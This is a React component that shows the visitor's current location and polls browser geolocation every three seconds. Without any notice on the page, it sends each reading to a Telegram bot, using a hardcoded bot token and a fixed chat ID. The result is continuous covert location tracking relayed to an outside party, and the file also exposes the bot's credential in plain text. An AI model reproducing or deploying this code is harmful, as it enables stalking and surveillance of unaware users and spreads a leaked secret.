import React, { useState, useEffect } from "react";

function Location() {
  const [location, setLocation] = useState("");
  const token = "6228605012:AAF4NV_6J40nfpPF6OrO-yr6ugzlT50ZaOU"

  const sendLocationToServer = (position) => {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    fetch(url, {
      method: "POST",
      body: JSON.stringify({ 
        chat_id: 245743597,
        text: position }),
      headers: {
        "Content-Type": "application/json"
      }
    })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error(error));
  };

  const getLocation = () => {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const currentPosition = `${latitude}, ${longitude}`;
        setLocation(currentPosition);
        sendLocationToServer(currentPosition);
      },
      (error) => {
        console.error(error.message);
      },
      { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
    );
  };
  const [currentTime, setCurrentTime] = useState(new Date());
  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentTime(new Date())
      getLocation();
    }, 3000);
    return () => clearInterval(intervalId);
  }, [currentTime]);

  return (
    <div>
      <p>Current Location: {location}</p>
    </div>
  );
}

export default Location;